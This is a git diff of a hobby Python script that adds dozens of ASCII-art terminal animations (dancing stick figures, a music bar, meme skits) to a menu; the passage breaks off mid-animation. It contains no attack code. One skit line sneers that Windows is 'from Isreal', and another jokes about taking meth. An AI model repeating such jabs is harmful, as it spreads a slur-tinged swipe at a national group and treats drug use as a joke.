@@ -1,12 +1,59 @@
+
+
+#Copyright (c) 2026 rxvy-dev (GitHub) / linuxrxvy (TikTok)
+#All rights reserved.
+
+#Permission is hereby granted to use and modify this code solely for your own personal use.
+
+#You are NOT allowed to:
+#1. Re-upload or redistribute the original code to ANY public sources.
+#2. Modify and re-upload the code to ANY public sources.
+
+#If there is a issue with the code, sugggestions please open a issue on github.
+
 import time
 
 def show_menu():
-    print("-_-_-_-_-_-_-_-_-_-_")
-    print("-_-_- 1:matrix -_-_-")
-    print("-_-_- 2:peak   -_-_-")
-    print("-_-_- 3:stars  -_-_-")
-    print("-_-_- 4:exit   -_-_-")
-    print("-_-_-_-_-_-_-_-_-_-_")
+    print("-_-_-_-_-_-_-_-_-_-_-_-_")
+    print("-_-_- 1:matrix     -_-_-")
+    print("-_-_- 2:peak       -_-_-")
+    print("-_-_- 3:stars      -_-_-")
+    print("-_-_- 4:67         -_-_-")
+    print("-_-_- 5:linux      -_-_-")
+    print("-_-_- 6:dance      -_-_-")
+    print("-_-_- 7:GOON       -_-_-")
+    print("-_-_- 8:jump       -_-_-")
+    print("-_-_- 9:music      -_-_-")
+    print("-_-_- 10.deleted   -_-_-")
+    print("-_-_- 11:mog       -_-_-")
+    print("-_-_- 12:eat       -_-_-")
+    print("-_-_- 13:crash     -_-_-")
+    print("-_-_- 14:stab      -_-_-")
+    print("-_-_- 15:idk       -_-_-")
+    print("-_-_- 16:dance2    -_-_-")
+    print("-_-_- 17:run       -_-_-")
+    print("-_-_- 18:boxin     -_-_-")
+    print("-_-_- 19:typer     -_-_-")
+    print("-_-_- 20:game      -_-_-")
+    print("-_-_- 21:spin      -_-_-")
+    print("-_-_- 22:rage      -_-_-")
+    print("-_-_- 23:base      _-_-_")
+    print("-_-_- ball         -_-_-")
+    print("-_-_- 24:snake     -_-_-")
+    print("-_-_- 25:bar       _-_-_")
+    print("-_-_- 26:back      _-_-_")
+    print("-_-_- rooms        _-_-_")
+    print("-_-_- 27:worms     _-_-_")
+    print("-_-_- 28:cool      _-_-_")
+    print("-_-_- 29:ERROR     _-_-_")
+    print("-_-_- 30:larp      _-_-_")
+    print("-_-_- 31:edp       _-_-_")
+    print("-_-_- 32:chess     _-_-_")
+    print("-_-_- 33:chess v2  _-_-_")
+    print("-_-_- 34:chess v3  _-_-_")
+    print("-_-_- 35:teeth     _-_-_")
+    print("-_-_- 36:𒊎         _-_-_")
+    print("-_-_-_-_-_-_-_-_-_-_-_-_")
 
 def main():
    while True:
@@ -2100,6 +2147,14314 @@ def main():
 """)               
 
         elif choice == '4':
-           break 
+            time.sleep(0.1)
+            print("""
+6           7""")
+            time.sleep(0.1)
+            print("""
+            7
+6                """)
+            time.sleep(0.1)
+            print("""
+6           7""")
+            time.sleep(0.1)
+            print("""
+6            
+            7     """)
+            time.sleep(0.1)
+            print("""
+6           7""")
+            time.sleep(0.1)
+            print("""
+            7
+6                """)
+            time.sleep(0.1)
+            print("""
+6           7""")
+            time.sleep(0.1)
+            print("""
+6            
+            7     """)
+            
+            time.sleep(0.1)
+            print("""
+6           7""")
+            time.sleep(0.1)
+            print("""
+            7
+6                """)
+            time.sleep(0.1)
+            print("""
+6           7""")
+            time.sleep(0.1)
+            print("""
+6            
+            7     """)
+            time.sleep(0.1)
+            print("""
+6           7""")
+            time.sleep(0.1)
+            print("""
+            7
+6                """)
+            time.sleep(0.1)
+            print("""
+6           7""")
+            time.sleep(0.1)
+            print("""
+6            
+            7     """)
+            time.sleep(0.1)
+            print("""
+6           7""")
+            time.sleep(0.1)
+            print("""
+            7
+6                """)
+            time.sleep(0.1)
+            print("""
+6           7""")
+            time.sleep(0.1)
+            print("""
+6            
+            7     """)
+            time.sleep(0.1)
+            print("""
+6           7""")
+            time.sleep(0.1)
+            print("""
+            7
+6                """)
+            time.sleep(0.1)
+            print("""
+6           7""")
+            time.sleep(0.1)
+            print("""
+6            
+            7     """)
+            time.sleep(0.1)
+            print("""
+6           7""")
+            time.sleep(0.1)
+            print("""
+            7
+6                """)
+            time.sleep(0.1)
+            print("""
+6           7""")
+            time.sleep(0.1)
+            print("""
+6            
+            7     """)
+            time.sleep(0.1)
+            print("""
+6           7""")
+            time.sleep(0.1)
+            print("""
+            7
+6                """)
+            time.sleep(0.1)
+            print("""
+6           7""")
+            time.sleep(0.1)
+            print("""
+6            
+            7     """)
+
+                
+        elif choice == '5':
+            print("""0 i use arch btw
+                  /|\
+                  / \ """)
+                  
+            time.sleep(1.0)
+            print("""0            0 shut up windows is better                                .
+                  /|\          /|\                               .
+                  / \          / \      """)
+                  
+            time.sleep(1.0)
+            print("""0 try linux for urself            0                                 .
+                  /|\                               /|\                               .
+                  / \                               / \      """)
+                  
+            time.sleep(1.0)
+            print("""0            0 fine                                .
+                    /|\          /|\                               .
+                    / \          / \      """)
+                  
+            time.sleep(1.0)
+            print("""           0 time to try this linux thing                                .
+                               /|\                               .
+                               / \      """)      
+                               
+            time.sleep(1.0)
+            print("""           0                                 .
+                               /|\  _|                             .
+                               / \ |--|    """)      
+            time.sleep(1.0)
+            print("""           0 THIS IS PEAK                                .
+                               /|\  _|                             .
+                               / \ |--|    """)   
+                               
+            time.sleep(1.0)
+            print("""            GUYS WINDOWS IS FROM ISREAL AND BLOAT 
+                                0           0       0       0      .
+                               /|\         /|\     /|\     /|\               .
+                               / \         / \     / \     / \                              """) 
+            time.sleep(1.0)
+            print("""                         stfu.... 
+                                0           0       0       0      .
+                               /|\         /|\     /|\     /|\               .
+                               / \         / \     / \     / \                              """)       
+        elif choice == '6':
+            time.sleep(0.2)
+            print("""
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+  0         
+ /|\     
+ / \          """)
+        
+            time.sleep(0.2)
+            print("""
+            
+            
+            
+            
+            
+            
+            
+            
+            
+  0         
+/ |\     
+ /  \          """)
+ 
+            time.sleep(0.2)
+            print("""
+            
+            
+            
+            
+            
+            
+            
+            
+            
+  0         
+ /|\     
+ / \          """)
+        
+            time.sleep(0.2)
+            print("""
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+  0         
+/ |\     
+/  \          """)
+
+            time.sleep(0.2)
+            print("""
+            
+            
+            
+            
+            
+            
+            
+  0         
+ /|\     
+ / \          """)
+        
+            time.sleep(0.2)
+            print("""
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+  0         
+/ |\     
+ /  \          """)
+ 
+            time.sleep(0.2)
+            print("""
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+  0         
+ /|\     
+ / \          """)
+        
+            time.sleep(0.2)
+            print("""
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+  0         
+/ |\     
+/  \          """)
+
+            time.sleep(0.2)
+            print("""
+            
+            
+            
+            
+            
+            
+  0         
+ /|\     
+ / \          """)
+        
+            time.sleep(0.2)
+            print("""
+            
+            
+            
+            
+            
+            
+  0         
+/ |\     
+ /  \          """)
+ 
+            time.sleep(0.2)
+            print("""
+            
+            
+            
+            
+            
+            
+  0         
+ /|\     
+ / \          """)
+        
+            time.sleep(0.2)
+            print("""
+            
+            
+            
+            
+            
+            
+            
+  0         
+/ |\     
+/  \          """)
+
+            time.sleep(0.2)
+            print("""
+            
+            
+            
+            
+            
+            
+  0         
+ /|\     
+ / \          """)
+        
+            time.sleep(0.2)
+            print("""
+            
+            
+            
+            
+            
+  0         
+/ |\     
+ /  \          """)
+ 
+            time.sleep(0.2)
+            print("""
+            
+            
+            
+            
+            
+            
+  0         
+ /|\     
+ / \          """)
+        
+            time.sleep(0.2)
+            print("""
+            
+            
+            
+            
+            
+  0         
+/ |\     
+/  \          """)
+
+            time.sleep(0.2)
+            print("""
+            
+            
+            
+            
+            
+  0         
+ /|\     
+ / \          """)
+        
+            time.sleep(0.2)
+            print("""
+            
+            
+            
+            
+            
+  0         
+/ |\     
+ /  \          """)
+ 
+            time.sleep(0.2)
+            print("""
+            
+            
+            
+            
+            
+  0         
+ /|\     
+ / \          """)
+        
+            time.sleep(0.2)
+            print("""
+            
+            
+            
+            
+            
+  0         
+/ |\     
+/  \          """)
+             
+        elif choice == '7':
+            time.sleep(0.1)
+            print("""
+ 0
+/|\---
+/ \
+""")
+
+            time.sleep(0.1)
+            print("""
+ 0
+/|-\--
+/ \
+""")
+
+            time.sleep(0.1)
+            print("""
+ 0
+/|--\-
+/ \
+""")
+
+            time.sleep(0.1)
+            print("""
+ 0
+/|-\--
+/ \
+""")
+
+            time.sleep(0.1)
+            print(""" 
+ 0
+/|\---
+/ \
+""")
+
+            time.sleep(0.1)
+            print("""
+ 0
+/|\---
+/ \
+""")
+
+            time.sleep(0.1)
+            print("""
+ 0
+/|-\--
+/ \
+""")
+
+            time.sleep(0.1)
+            print("""
+ 0
+/|--\-
+/ \
+""")
+
+            time.sleep(0.1)
+            print("""
+ 0
+/|-\--
+/ \
+""")
+
+            time.sleep(0.1)
+            print(""" 
+ 0
+/|\---
+/ \
+""")
+
+            time.sleep(0.1)
+            print("""
+ 0
+/|\---
+/ \
+""")
+
+            time.sleep(0.1)
+            print("""
+ 0
+/|-\--
+/ \
+""")
+
+            time.sleep(0.1)
+            print("""
+ 0
+/|--\-
+/ \
+""")
+
+            time.sleep(0.1)
+            print("""
+ 0
+/|-\--
+/ \
+""")
+
+            time.sleep(0.1)
+            print(""" 
+ 0
+/|\---
+/ \
+""")
+
+            time.sleep(0.1)
+            print("""
+ 0
+/|\---
+/ \
+""")
+
+            time.sleep(0.1)
+            print("""
+ 0
+/|-\--
+/ \
+""")
+
+            time.sleep(0.1)
+            print("""
+ 0
+/|--\-
+/ \
+""")
+
+            time.sleep(0.1)
+            print("""
+ 0
+/|-\--
+/ \
+""")
+
+            time.sleep(0.1)
+            print(""" 
+ 0
+/|\---
+/ \
+""")
+
+            time.sleep(0.1)
+            print("""
+ 0
+/|\---
+/ \
+""")
+
+            time.sleep(0.1)
+            print("""
+ 0
+/|-\--
+/ \
+""")
+
+            time.sleep(0.1)
+            print("""
+ 0
+/|--\-
+/ \
+""")
+
+            time.sleep(0.1)
+            print("""
+ 0
+/|-\--
+/ \
+""")
+
+            time.sleep(0.1)
+            print(""" 
+ 0
+/|\---
+/ \
+""")
+
+            time.sleep(0.1)
+            print("""
+ 0
+/|\---
+/ \
+""")
+
+            time.sleep(0.1)
+            print("""
+ 0
+/|-\--
+/ \
+""")
+
+            time.sleep(0.1)
+            print("""
+ 0
+/|--\-
+/ \
+""")
+
+            time.sleep(0.1)
+            print("""
+ 0
+/|-\--
+/ \
+""")
+
+            time.sleep(0.1)
+            print(""" 
+ 0
+/|\---
+/ \
+""")
+
+            time.sleep(0.1)
+            print("""
+ 0
+/|\---
+/ \
+""")
+
+            time.sleep(0.1)
+            print("""
+ 0
+/|-\--
+/ \
+""")
+
+            time.sleep(0.1)
+            print("""
+ 0
+/|--\-
+/ \
+""")
+
+            time.sleep(0.1)
+            print("""
+ 0
+/|-\--
+/ \
+""")
+
+            time.sleep(0.1)
+            print(""" 
+ 0
+/|\---
+/ \
+""")
+
+        elif choice == '8':
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \   
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \ 
+
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \   
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \ 
+
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \   
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \ 
+
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \   
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \ 
+
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \   
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \ 
+
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \   
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \ 
+
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \   
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \ 
+
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \   
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \ 
+
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \   
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \ 
+
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \   
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \ 
+
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \   
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \ 
+
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \   
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \ 
+
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \   
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \ 
+
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \   
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \ 
+
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \   
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \ 
+
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \   
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \ 
+
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \   
+---
+""")
+
+            time.sleep(0.2)
+            print(""" 
+ 0           
+/|\         
+/ \ 
+
+---
+""")
+
+        elif choice == '9':
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+          █  
+          █  
+          █          █
+          █       █  █
+          █   █   █  █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+           
+            
+          █          █
+          █   █   █  █
+          █   █   █  █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+        
+          █       █  
+          █   █   █       
+          █   █   █  █     █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+          █  
+          █  
+          █                █             
+          █       █        █
+          █       █  █     █
+          █       █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+          █  
+          █  
+          █          █
+          █       █  █
+          █   █   █  █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+        
+          █          █
+          █   █      █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+
+          █       █        █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+          █  
+          █  
+          █          █
+          █       █  █
+          █   █   █  █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+          █  
+          █  
+          █          █
+          █       █  █
+          █   █   █  █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+           
+            
+          █          █
+          █   █   █  █
+          █   █   █  █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+        
+          █       █  
+          █   █   █       
+          █   █   █  █     █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+          █  
+          █  
+          █                █             
+          █       █        █
+          █       █  █     █
+          █       █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+          █  
+          █  
+          █          █
+          █       █  █
+          █   █   █  █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+        
+          █          █
+          █   █      █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+
+          █       █        █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+          █  
+          █  
+          █          █
+          █       █  █
+          █   █   █  █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+          █  
+          █  
+          █          █
+          █       █  █
+          █   █   █  █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+           
+            
+          █          █
+          █   █   █  █
+          █   █   █  █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+        
+          █       █  
+          █   █   █       
+          █   █   █  █     █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+          █  
+          █  
+          █                █             
+          █       █        █
+          █       █  █     █
+          █       █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+          █  
+          █  
+          █          █
+          █       █  █
+          █   █   █  █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+        
+          █          █
+          █   █      █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+
+          █       █        █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+          █  
+          █  
+          █          █
+          █       █  █
+          █   █   █  █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+          █  
+          █  
+          █          █
+          █       █  █
+          █   █   █  █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+           
+            
+          █          █
+          █   █   █  █
+          █   █   █  █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+        
+          █       █  
+          █   █   █       
+          █   █   █  █     █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+          █  
+          █  
+          █                █             
+          █       █        █
+          █       █  █     █
+          █       █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+          █  
+          █  
+          █          █
+          █       █  █
+          █   █   █  █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+        
+          █          █
+          █   █      █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+
+          █       █        █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+          █  
+          █  
+          █          █
+          █       █  █
+          █   █   █  █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+          █  
+          █  
+          █          █
+          █       █  █
+          █   █   █  █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+           
+            
+          █          █
+          █   █   █  █
+          █   █   █  █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+        
+          █       █  
+          █   █   █       
+          █   █   █  █     █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+          █  
+          █  
+          █                █             
+          █       █        █
+          █       █  █     █
+          █       █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+          █  
+          █  
+          █          █
+          █       █  █
+          █   █   █  █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+        
+          █          █
+          █   █      █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+
+          █       █        █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+          █  
+          █  
+          █          █
+          █       █  █
+          █   █   █  █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+          █  
+          █  
+          █          █
+          █       █  █
+          █   █   █  █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+           
+            
+          █          █
+          █   █   █  █
+          █   █   █  █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+        
+          █       █  
+          █   █   █       
+          █   █   █  █     █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+          █  
+          █  
+          █                █             
+          █       █        █
+          █       █  █     █
+          █       █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+          █  
+          █  
+          █          █
+          █       █  █
+          █   █   █  █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+        
+          █          █
+          █   █      █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+
+          █       █        █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+          █  
+          █  
+          █          █
+          █       █  █
+          █   █   █  █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+          █  
+          █  
+          █          █
+          █       █  █
+          █   █   █  █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+           
+            
+          █          █
+          █   █   █  █
+          █   █   █  █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+        
+          █       █  
+          █   █   █       
+          █   █   █  █     █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+          █  
+          █  
+          █                █             
+          █       █        █
+          █       █  █     █
+          █       █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+          █  
+          █  
+          █          █
+          █       █  █
+          █   █   █  █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+        
+          █          █
+          █   █      █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+
+          █       █        █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+          █  
+          █  
+          █          █
+          █       █  █
+          █   █   █  █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+          █  
+          █  
+          █          █
+          █       █  █
+          █   █   █  █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+           
+            
+          █          █
+          █   █   █  █
+          █   █   █  █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+        
+          █       █  
+          █   █   █       
+          █   █   █  █     █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+          █  
+          █  
+          █                █             
+          █       █        █
+          █       █  █     █
+          █       █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+          █  
+          █  
+          █          █
+          █       █  █
+          █   █   █  █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+        
+          █          █
+          █   █      █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+
+          █       █        █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+            time.sleep(0.2)
+            print(""" 
+            
+            
+            
+            
+          █  
+          █  
+          █          █
+          █       █  █
+          █   █   █  █     █
+          █   █   █  █  █  █ 
+          █   █   █  █  █  █                    """)
+
+        elif choice == '10':
+            time.sleep(0.67)
+            print(" this was deleted for some reason ") 
+
+        elif choice == '11':
+            time.sleep(1.0)
+            print("""
+             0 new trend mogging and jawbreaking?       
+            /|\              .
+            / \              .
+            
+            
+                           """)
+            time.sleep(1.0)
+            print("""
+             8 ok i broke my jaw and took meth       
+            /|\              .
+            / \              .
+            
+            
+                           """)
+            time.sleep(1.0)
+            print("""
+             8 'wait only guys like me. i wasted my looks'       
+            /|\              .
+            / \              .
+            
+            
+                           """)
+            time.sleep(1.0)
+            print("""
+             8 'it doesnt matter I MOG hehe (im so stupid)'       
+            /|\              .
+            / \              .
+            
+            
+                           """)
+                           
+        elif choice == '12':
+            time.sleep(1.0)
+            print(""""
+                 
+                 
+                 
+                 
+                 
+                 
+                 
+                 
+                 
+ 0  im hungry.....               
+/|\                
+/ \                 
+                 
+                 
+                                             """)
+                                             
+            time.sleep(1.0)
+            print(""""
+                 
+                 
+                 
+                 
+                       ████████████████████
+                       ░░░░░░░░░░░░░░░░░░░░
+                       ████████████████████
+                 
+                 
+                 
+                 
+ 0  SO BIG.....                  
+/|\                
+/ \                 
+                 
+                 
+                                             """)
+                                             
+            time.sleep(1.0)
+            print(""""
+                 
+                 
+                 
+                 
+                       ████████████████████
+                       ░░░░░░░░░░░░░░░░░░░░
+█████████████          ████████████████████
+█                 
+█                 
+█                 
+█                 
+█████████████            
+/|\                
+/ \                 
+                 
+                 
+                                             """)
+            time.sleep(1.0)
+            print(""""
+                 
+                 
+                 
+                 
+                       
+                       
+█████████████  
+█                 
+█                 ████████████████████                
+█                 ░░░░░░░░░░░░░░░░░░░░
+█                 ████████████████████
+█                 
+█████████████            
+/|\                
+/ \                 
+                 
+                 
+                                             """)
+            time.sleep(1.0)
+            print(""""
+                 
+                 
+                 
+                 
+                       
+                       
+█████████████  
+█                 
+█        ████████████████████                
+█        ░░░░░░░░░░░░░░░░░░░░
+█        ████████████████████
+█                 
+█████████████            
+/|\                
+/ \                 
+                 
+                 
+                                             """)
+            time.sleep(1.0)
+            print(""""
+                 
+                 
+                 
+                 
+                       
+                       
+█████████████  
+█                 
+█████████████████████                
+█░░░░░░░░░░░░░░░░░░░░
+█████████████████████
+█                 
+█████████████            
+/|\                
+/ \                 
+                 
+                 
+                                             """)
+            time.sleep(1.0)
+            print(""""
+                 
+                 
+                 
+                 
+                       
+                       
+█████████████  
+█████████████                 
+█████████████                
+█████████████
+█████████████
+█████████████                 
+█████████████            
+/|\                
+/ \                 
+                 
+                 
+                                             """)
+
+        elif choice == '13':
+           time.sleep(0.5)
+           print(""""
+            
+           _________           
+           |        \___                                         |
+           |            |                                        |
+            |•|----|•|--                                         |
+            
+                                                            """)
+
+           time.sleep(0.5)
+           print("""
+                                                            
+              _________           
+              |        \___                                      |
+              |            |                                     |
+               |•|----|•|--                                      |
+                                                            
+                                                                                                            """)
+           time.sleep(0.5)
+           print("""
+                                                                                                                                                             
+                  _________           
+                  |        \___                                  |
+                  |            |                                 |
+                   |•|----|•|--                                  |
+                                                                                                                                                             
+                                                                              """)
+
+           time.sleep(0.5)
+           print("""
+                                                                                                                                                                                                                                  
+                           _________           
